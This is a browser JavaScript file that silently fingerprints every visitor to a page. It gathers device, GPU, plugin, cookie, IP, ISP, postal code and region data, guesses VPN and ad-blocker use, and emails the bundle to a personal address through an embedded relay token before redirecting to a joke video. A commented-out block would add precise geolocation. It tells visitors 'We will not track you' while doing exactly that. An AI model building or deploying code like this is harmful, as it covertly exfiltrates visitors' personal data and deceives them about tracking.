var loadTime = window.performance.timing.domContentLoadedEventEnd- window.performance.timing.navigationStart;
var tz = "none";
window.onload = function () {
  var loadTime = window.performance.timing.domContentLoadedEventEnd-window.performance.timing.navigationStart; 
  console.log('Page load time is '+ loadTime);
}

if(navigator.cookieEnabled) {
	console.log("Cookie");
}
else {
	console.log("No Cookie");
	alert("Please enable cookies for the site to work correctly.\nWe will not track you.");
}

function getOS() {
  var userAgent = window.navigator.userAgent,
      platform = window.navigator.platform,
      macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
      windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
      iosPlatforms = ['iPhone', 'iPad', 'iPod'],
      os = null;
  if (macosPlatforms.indexOf(platform) !== -1) {
    os = 'Mac OS';
  } else if (iosPlatforms.indexOf(platform) !== -1) {
    os = 'iOS';
  } else if (windowsPlatforms.indexOf(platform) !== -1) {
    os = 'Windows';
  } else if (/Android/.test(userAgent)) {
    os = 'Android';
  } else if (!os && /Linux/.test(platform)) {
    os = 'Linux';
  }
  return os;
}

function plugns(){
  var plugs = ".\nInstalled plug-ins: ";
  for (var i = 0; i < navigator.plugins.length; i++) {
    plugs = plugs + (i + 1) + ": " + navigator.plugins[i].name + " ";
  }
  return plugs;
}

function ip() {
  $.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {
    var ipa = data.ip;
    var post = data.postal_code;
    window.post = post;
    var cont = data.country_name;
    var isp = data.isp;
    window.isp = isp;
    var region = data.region;
    window.region = region;
    var tz = data.timezone_name;
    window.tz = tz;
    var currency = data.currency_name;

    var ipInfo = "";
    ipInfo += ".\nInternet Service Provider (ISP): " + isp;
    ipInfo += ".\nIP adress: " + ipa;
    ipInfo += ".\nPostal code: " + post;
    ipInfo += ".\nCountry: " + cont;
    ipInfo += ".\nRegion: " + region;
    ipInfo += ".\nCurrency: " + currency + ".\n";
    gd += ipInfo;
  });
}

function gpu(){
  var canvas = document.createElement('canvas');
  var gl;
  var debugInfo;
  var vendor;
  var renderer;
  try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  }
  catch (e) { }
  if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    render = renderer;
    window.render = render;
    window.vendor = vendor;
    if(vendor.includes("Google Inc.")) {
      var ret = vendor.replace('Google Inc.','');
    }
    gd += ".\nGPU: " + ret;
    gd += ".\nRenderer: " + renderer;
  }
}

var gd = "";
var now = Date().toLocaleString();
var os = getOS();
var memory = window.navigator.deviceMemory;
var cpu = window.navigator.hardwareConcurrency;
var lang = window.navigator.language;
var touch = window.navigator.maxTouchPoints;
var usr = window.navigator.userAgent;
var resolution = screen.width * devicePixelRatio + "x" + screen.height * devicePixelRatio + "p";
var color = screen.colorDepth;
var pixel = screen.pixelDepth;
var cookie = document.cookie;
if (cookie == "") cookie = "no cookies";
var line = window.navigator.onLine;
var char = document.characterSet;
var ref = document.referrer;
if (ref == "") ref = "direct";

gd += "Time Visited: "+ now;
gd += ".\nOperating system: " + os;
gd += ".\nMemory: " + memory + "GB";
gd += ".\nNumber of CPU cores: " + cpu;
gd += ".\nLanguage: " + lang;
gd += ".\nTouch screen: " + touch;
gd += ".\nUser agent: "+ usr;
gd += ".\nScreen resolution: "+ resolution;
gd += ".\nScreen color depth: "+ color +" bits";
gd += ".\nPixel depth: "+ pixel +" bits";
gd += ".\nCookies: "+ cookie;
gd += ".\nConnected to the internet: "+ line;
gd += ".\nCharacter Encoding: "+ char;
gd += ".\nUser came from: " + ref;
gd += plugns();
ip();
detectAdBlock();
gpu();
get_login_status();
             
function get_login_status(network, status){
  gd += ".\nLogged into Google: " + status;
}
                 
async function detectAdBlock() {
  let adBlockEnabled = false
  const googleAdUrl = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js'
  try {
    await fetch(new Request(googleAdUrl)).catch(_ => adBlockEnabled = true)
  } catch (e) {
    adBlockEnabled = true;
    gd = gd + ".\nAdBlocker enabled: true";
  } finally {
    gd = gd + ".\nAdBlocker enabled: false";
  }
}

function get_browser() {
  var ua=navigator.userAgent,tem,M=ua.match(/(fxios|opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || []; 
  if(/trident/i.test(M[1])){
    tem=/\brv[ :]+(\d+)/g.exec(ua) || []; 
    return { name:'IE',version:(tem[1]||'') };
  }
  if(M[1]==='Chrome') {
    tem=ua.match(/\bOPR|Edge\/(\d+)/)
    if (tem != null) { return {name:'Opera', version:tem[1]}; }
  }
  M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
  if ((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]); }
  return {
    name: M[0],
    version: M[1]
  };
}

var browser = get_browser();

var browsern = browser.name;
var bversion = browser.version;
if(browsern == "FxiOS") { browsern = "Firefox On iOS"; }

function timecheck(){
  vpn = "unable to detect";
  if(tz !="none"){
    var btz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    if(tz == btz){
      vpn = "false";
    }
    else {
      vpn = "true";
    }
  }
  gd = gd + ".\nVPN enabled: " + vpn;
}
timecheck();

viewmode = "light";
if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
    console.log("Dark Mode");
    viewmode = "dark"
} else console.log("Light Mode");
gd = gd + ".\nColor scheme: " + viewmode;

function sendEmail() {
  Email.send({
    SecureToken: "ddce9da2-557b-412d-bf98-b417d022716c",
    To : "nicolasbarbierisousa@icloud.com",
    From : "nicolasbarbierisousa@gmail.com",
    Subject : "New access to Pessoa detected.",
    Body : gd
    }).then(
    console.log("Acesso anunciado.")
  );
}

console.log(gd);
setTimeout(sendEmail, 500);
setTimeout(redirect, 1000);

function redirect () {
  window.location.href = "https://youtu.be/dQw4w9WgXcQ";
}

/*function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(getPosition);
  } else {
    gd += ".\nGeolocation is not supported by the user's browser";
  }
}

function getPosition(position) {
  var positionInfo = ".\nGeographical coordinates: (" + position.coords.latitude + ", " + position.coords.longitude + ")";
  positionInfo += ".\nAccuracy: " + position.coords.accuracy.toFixed(1) + "m";

  positionInfo += ".\nAltitude: ";
  if (position.coords.altitude != null) positionInfo +=  position.coords.altitude + "m";
  else positionInfo += "not available";

  positionInfo += ".\nSpeed: ";
  if (position.coords.speed != null) positionInfo += position.coords.speed + "m/s (" + position.coords.speed * 3.6 + "km/h)";
  else positionInfo += "not available";

  positionInfo += ".\nHeading: ";
  if (position.coords.heading != null) positionInfo += position.coords.heading + "degrees";
  else positionInfo += "not available";
  
  gd += positionInfo;
}*/
